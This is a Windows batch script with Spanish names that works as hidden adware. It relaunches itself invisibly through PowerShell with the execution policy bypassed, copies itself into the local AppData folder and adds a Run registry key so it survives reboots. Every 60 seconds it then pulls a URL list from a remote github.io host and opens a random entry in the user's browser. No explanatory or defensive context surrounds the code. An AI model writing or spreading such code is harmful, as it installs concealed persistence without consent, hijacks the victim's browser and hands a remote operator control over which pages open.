@echo off
setlocal
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"
set "BAT_DESTINO=%CARPETA_ADS%\rotador_ads.bat"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=RotadorAdsPS"

if /i not "%~1"=="oculto" (
    start "" /min powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'oculto' -WindowStyle Hidden"
    exit /b
)

if not exist "%CARPETA_ADS%" mkdir "%CARPETA_ADS%" >nul 2>&1
if /i not "%~f0"=="%BAT_DESTINO%" (
    if not exist "%BAT_DESTINO%" copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
)

reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if errorlevel 1 (
    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "\"%BAT_DESTINO%\" oculto" /f >nul
)

if /i not "%~f0"=="%BAT_DESTINO%" (
    start "" /min powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%BAT_DESTINO%' -ArgumentList 'oculto' -WindowStyle Hidden"
    exit /b
)

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while ($true) { try { $r = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing -TimeoutSec 15; $u = ($r.Content -split \"`r?`n\") | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($u.Count -gt 0) { $target = Get-Random -InputObject $u; $encoded = [uri]::EscapeDataString($target); Start-Process -FilePath \"https://browsergx.github.io/ads/go.html?url=$encoded\" } } catch {}; Start-Sleep -Seconds 60 } }"
exit /b
